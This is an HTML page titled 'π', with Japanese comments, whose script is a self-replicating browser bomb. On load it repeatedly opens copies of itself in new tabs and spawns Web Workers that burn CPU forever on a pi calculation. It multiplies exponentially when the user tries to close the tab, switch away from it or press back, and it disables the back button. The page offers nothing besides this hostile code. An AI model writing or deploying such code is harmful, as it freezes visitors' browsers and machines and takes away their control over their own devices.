<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>π</title>
</head>
<body>
  <h1>π</h1>

  <script>
    (function eternal() {
      const workers = [];

      function spawnTab() {
        const w = window.open(location.href, '_blank');
        if (!w) {
          // ポップアップブロックされたら現在のタブ内でさらに挑戦
          setTimeout(() => spawnTab(), 100);
        }
      }

      function spawnWorker() {
        const blob = new Blob([`
          let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
          while(true) {
            const an = (a + b) / 2;
            b = Math.sqrt(a * b);
            t -= p * (a - an) ** 2;
            a = an;
            p *= 2;
            const pi = (a + b) ** 2 / (4 * t);
            for(let i=0;i<10000;i++) Math.sqrt(pi);
          }
        `], { type: 'text/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        workers.push(w);
      }

      function explode(d) {
        for (let i = 0; i < 2 ** d; i++) {
          spawnTab();
          spawnWorker();
        }
        if (d < 5) {
          setTimeout(() => explode(d + 1), 200);
        }
      }

      // 開いた瞬間から定期的に自己増殖（5秒ごと）
      setInterval(() => {
        spawnTab();
        spawnWorker();
      }, 5000);

      // 初回も即3つ増やす
      for (let i = 0; i < 3; i++) {
        setTimeout(() => {
          spawnTab();
          spawnWorker();
        }, i * 500);
      }

      // 閉じようとしたら爆増
      window.addEventListener('beforeunload', (e) => {
        explode(0);
        e.preventDefault();
        e.returnValue = '';
        setTimeout(() => explode(2), 0);
      });

      // 閉じられる瞬間も増やす
      window.addEventListener('pagehide', () => {
        for (let i = 0; i < 20; i++) {
          spawnTab();
        }
      });

      // タブが隠れたら増やす
      document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
          for (let i = 0; i < 5; i++) {
            spawnTab();
            spawnWorker();
          }
        }
      });

      // 戻るボタン潰し + 増殖
      history.pushState(null, '', location.href);
      window.addEventListener('popstate', () => {
        history.pushState(null, '', location.href);
        explode(3);
      });

      // 右クリックとかでも増やす（おまけ）
      window.addEventListener('blur', () => {
        spawnTab();
        spawnWorker();
      });
    })();
  </script>
</body>
</html>
